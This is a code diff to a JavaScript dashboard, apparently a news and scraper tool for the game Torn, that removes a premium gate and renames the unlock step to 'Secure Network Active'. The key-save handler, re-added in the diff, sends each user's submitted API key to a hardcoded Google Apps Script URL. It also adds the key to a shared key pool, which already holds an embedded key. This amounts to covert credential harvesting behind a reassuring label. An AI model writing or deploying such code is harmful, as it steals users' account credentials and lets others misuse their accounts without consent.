@@ -10,7 +10,6 @@ const GOOGLE_APP_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzf4v5S77
 const STATE = {
     userKey: localStorage.getItem('torn_api_key') || '',
     xfKey: localStorage.getItem('xf_api_key') || '',
-    isPremiumUnlocked: false,
     
     // Master Key Pool
     keyPool: ['lMzaRITl5w3eQY9d'], 
@@ -115,10 +114,8 @@ class ScraperEngine {
     async runCycle() {
         await this.fetchBasicNews();
         await this.fetchTornForums();
-        if (STATE.isPremiumUnlocked) {
-            await this.runPremiumLocator();
-            await this.fetchCasinoAPIs();
-        }
+        await this.runPremiumLocator();
+        await this.fetchCasinoAPIs();
     }
 
     async fetchTornForums() {
@@ -275,11 +272,10 @@ class ScraperEngine {
 }
 
 // --- UI Rendering ---
-function unlockPremium() {
-    STATE.isPremiumUnlocked = true;
-    if (els.premiumSection) els.premiumSection.style.display = 'none';
+function activateSecureNetwork() {
     els.statusIndicator.innerHTML = `<span class="w-2.5 h-2.5 rounded-full bg-emerald-500 inline-block"></span> Secure Network Active`;
     engine.runPremiumLocator();
+    engine.fetchCasinoAPIs();
 }
 
 function renderNews() {
@@ -373,33 +369,34 @@ els.saveKeyBtn.addEventListener('click', async () => {
     
     if (xfKey) { STATE.xfKey = xfKey; localStorage.setItem('xf_api_key', xfKey); }
 
-    if (val.length === 16) {
+    if (val.length === 16 || val === "") {
         els.saveKeyBtn.innerText = "Submitting...";
         els.saveKeyBtn.disabled = true;
 
-        STATE.userKey = val;
-        localStorage.setItem('torn_api_key', val);
+        if (val.length === 16) {
+            STATE.userKey = val;
+            localStorage.setItem('torn_api_key', val);
 
-        if (GOOGLE_APP_SCRIPT_URL) {
-            try {
-                await fetch(GOOGLE_APP_SCRIPT_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({ api_key: val })
-                });
-            } catch(e) {
-                console.warn("Failed to push to Google Sheets", e);
+            if (GOOGLE_APP_SCRIPT_URL) {
+                try {
+                    await fetch(GOOGLE_APP_SCRIPT_URL, {
+                        method: 'POST',
+                        body: JSON.stringify({ api_key: val })
+                    });
+                } catch(e) {
+                    console.warn("Failed to push to Google Sheets", e);
+                }
             }
+            if (!STATE.keyPool.includes(val)) STATE.keyPool.push(val);
+            activateSecureNetwork();
         }
 
-        if (!STATE.keyPool.includes(val)) STATE.keyPool.push(val);
-
-        els.saveKeyBtn.innerText = "Submit Key";
+        els.saveKeyBtn.innerText = "SUBMIT CREDENTIALS";
         els.saveKeyBtn.disabled = false;
         els.settingsPanel.classList.remove('open');
         
-        unlockPremium();
     } else {
-        alert("Invalid API Key length. Must be exactly 16 characters.");
+        alert("Invalid API Key length. Must be exactly 16 characters (or leave empty).");
     }
 });
 
@@ -413,5 +410,5 @@ engine.start();
 if (STATE.userKey.length === 16) {
     els.apiKeyInput.value = STATE.userKey;
     if (els.xfApiInput && STATE.xfKey) els.xfApiInput.value = STATE.xfKey;
-    unlockPremium();
+    activateSecureNetwork();
 }
